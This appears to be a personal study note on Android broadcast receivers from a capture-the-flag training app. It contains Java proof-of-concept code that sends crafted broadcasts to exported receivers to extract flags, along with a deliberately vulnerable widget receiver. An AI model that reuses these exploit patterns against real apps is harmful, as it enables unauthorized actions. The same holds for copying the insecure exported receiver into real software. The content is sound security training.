# Broadcast Receiver 
- [Overview](#overview)
- [Ordered Broadcast](#ordered-broadcast)
- [Widgets](#widgets)
- [Notifications](#notifications)

## Overview
- There are two ways how broadcast receivers could be used by an app. First they could be exported via the AndroidManifest.xml with a `<receiver>` tag.

- The other way is by dynamically registering a receiver class using `registerReceiver()`.

> [!IMPORTANT]
> Please keep the following in mind: you do not have the required privileges to send system broadcasts to applications or to specific broadcast receivers; however, execution can still reach the `else` branch of the logic.

## Ordered Broadcast
- Send Ordered Broadcast and get results
```java
Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag17Receiver"
        ));

        // Required secret
        intent.putExtra("flag", "give-flag-17");

        sendOrderedBroadcast(
                intent,
                null,
                new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        Bundle result = getResultExtras(false);
                        if (result != null) {
                            Log.i("FLAG17", "Success: " + result.getBoolean("success"));
                            Log.i("FLAG17", "Flag: " + result.getString("flag"));
                        }
                    }
                },
                null,
                RESULT_OK,
                null,
                null
        );

        finish();
```

## Widgets
- Widgets are a cool feature allowing apps to create small user interfaces that get directly embedded on the home screen. 
- This means the widgets are actually running within another app!

- The AppWidgetProvider is actually a wrapper around BroadcastReceiver to update the widget data in the background. It can also handle interactions with the widget such as button presses. But because the widget is running inside the home screen, broadcast `PendingIntents` are used to handle the button presses.

- Example of vulnerable exported widget: 
```java
   public void onReceive(Context context, Intent intent) {
        Bundle bundleExtra;
        Log.i("Flag19Widget.onReceive", Utils.dumpIntent(context, intent));
        super.onReceive(context, intent);
        String action = intent.getAction();
        if (action == null || !action.contains("APPWIDGET_UPDATE") || (bundleExtra = intent.getBundleExtra("appWidgetOptions")) == null) {
            return;
        }
        int i = bundleExtra.getInt("appWidgetMaxHeight", -1);
        int i2 = bundleExtra.getInt("appWidgetMinHeight", -1);
        if (i == 1094795585 && i2 == 322376503) {
            success(context);
        }
    }
```
- PoC
```java
Intent intent = new Intent();
        Bundle bundle = new Bundle();

        bundle.putInt("appWidgetMaxHeight", 1094795585);
        bundle.putInt("appWidgetMinHeight", 322376503);

        intent.setAction("APPWIDGET_UPDATE");
        intent.putExtra("appWidgetOptions", bundle);
        intent.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag19Widget"
        );

        sendBroadcast(intent);
```

## Notifications
- Notifications can be easily created using the notification builder. Inside of notifications you can also add button actions by preparing a `PendingIntent`. The reason for that is because the notification is again handled by a different app.

